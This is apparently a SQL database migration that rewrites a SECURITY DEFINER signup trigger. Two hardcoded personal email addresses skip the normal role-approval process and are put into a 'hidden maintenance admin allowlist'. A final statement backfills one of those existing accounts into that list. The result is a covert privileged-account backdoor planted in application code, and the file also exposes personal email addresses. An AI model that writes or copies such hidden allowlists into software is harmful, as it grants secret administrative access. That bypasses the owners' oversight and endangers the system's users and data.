-- Add doe614094@gmail.com to hidden maintenance admin allowlist
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $$
DECLARE
  _org_id uuid;
  _requested_roles public.app_role[];
  _is_maint boolean := lower(NEW.email) IN ('stanleyvic13@gmail.com','doe614094@gmail.com');
BEGIN
  SELECT id INTO _org_id FROM public.organizations
    WHERE name = 'NIF Technical Services Ltd' ORDER BY created_at ASC LIMIT 1;
  IF _org_id IS NULL THEN
    SELECT id INTO _org_id FROM public.organizations ORDER BY created_at ASC LIMIT 1;
  END IF;

  INSERT INTO public.profiles (user_id, full_name, organization_id)
  VALUES (NEW.id, COALESCE(NEW.raw_user_meta_data->>'full_name', NEW.email), _org_id)
  ON CONFLICT (user_id) DO UPDATE
    SET full_name = EXCLUDED.full_name,
        organization_id = COALESCE(public.profiles.organization_id, EXCLUDED.organization_id);

  IF _is_maint THEN
    INSERT INTO public.system_maintenance_accounts (user_id) VALUES (NEW.id)
    ON CONFLICT DO NOTHING;
    RETURN NEW;
  END IF;

  SELECT coalesce(array_agg(value::public.app_role), ARRAY['technician'::public.app_role])
  INTO _requested_roles
  FROM jsonb_array_elements_text(COALESCE(NEW.raw_user_meta_data->'requested_roles', '["technician"]'::jsonb));

  INSERT INTO public.role_assignment_requests (organization_id, user_id, requested_roles, status)
  VALUES (_org_id, NEW.id, _requested_roles, 'pending')
  ON CONFLICT DO NOTHING;

  RETURN NEW;
END;
$$;

-- Backfill: promote existing account if it already exists
INSERT INTO public.system_maintenance_accounts (user_id)
SELECT id FROM auth.users WHERE lower(email) = 'doe614094@gmail.com'
ON CONFLICT DO NOTHING;
